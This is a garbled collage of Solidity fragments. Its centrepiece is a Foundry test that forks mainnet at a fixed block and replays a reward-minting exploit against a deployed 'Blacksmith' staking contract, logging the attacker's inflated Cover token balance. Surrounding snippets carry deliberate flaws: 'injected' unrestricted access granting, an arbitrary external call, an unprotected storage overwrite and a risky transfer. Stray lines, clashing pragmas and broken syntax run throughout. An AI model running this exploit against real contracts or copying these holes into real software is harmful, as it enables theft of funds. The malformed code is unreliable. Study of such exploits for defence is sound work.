
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity 0.8.10;

Contract source code:;

;
;
interface Blacksmith {
  function claimRewardsForPools(address[] calldata _lpTokens) external;
  function claimRewards(address _lpToken) external;
  function deposit(address _lpToken, uint256 _amount) external;
  function withdraw(address _lpToken, uint256 _amount) external};
contract ContractTest is DSTest {
  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  Blacksmith public bs = Blacksmith(0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5);
  IERC20 public bpt = IERC20(0x59686E01Aa841f622a43688153062C2f24F8fDed);
  IERC20 public Cover = IERC20(0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286);
  function setUp() public {
    cheat.createSelectFork("mainnet", 11542309)};
  function test() public {
    cheat.prank(0x00007569643bc1709561ec2E86F385Df3759e5DD);
    bs.deposit(address(bpt), 15255552810089260015361);
    emit log_named_uint("Deposit BPT", 15255552810089260015361);
    cheat.prank(0x00007569643bc1709561ec2E86F385Df3759e5DD);
    bs.claimRewards(address(bpt));
    emit log_named_uint("After claimRewards, Cover Balance",
      Cover.balanceOf(0x00007569643bc1709561ec2E86F385Df3759e5DD));
    bs.withdraw(address(bpt), 100);
    bs.claimRewards(address(bpt));
    emit log_named_uint("After claimRewards, Cover Balance",
      Cover.balanceOf(0x00007569643bc1709561ec2E86F385Df3759e5DD));
    bs.withdraw(address(bpt), 200)}
function duplicateSubmission(bytes memory signedData) public {
    externalContract.call(signedData)}
function sendToNoFallback(address payable recipient) public {
    recipient.transfer(1 ether)}
bytes32 public slot0;
function overwriteSlot(bytes32 newData) public {
    slot0 = newData}